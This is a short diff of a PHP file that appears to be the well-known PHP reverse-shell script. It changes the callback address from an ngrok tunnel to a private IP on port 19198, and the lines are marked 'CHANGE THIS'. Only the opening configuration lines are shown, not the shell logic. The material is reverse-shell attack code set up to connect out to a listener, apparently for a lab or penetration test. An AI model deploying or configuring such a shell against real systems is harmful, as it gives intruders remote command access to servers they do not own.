@@ -1,7 +1,7 @@
 <?php
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '0.tcp.ap.ngrok.io';  // CHANGE THIS
+$ip = '10.17.5.19';  // CHANGE THIS
 $port = 19198;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
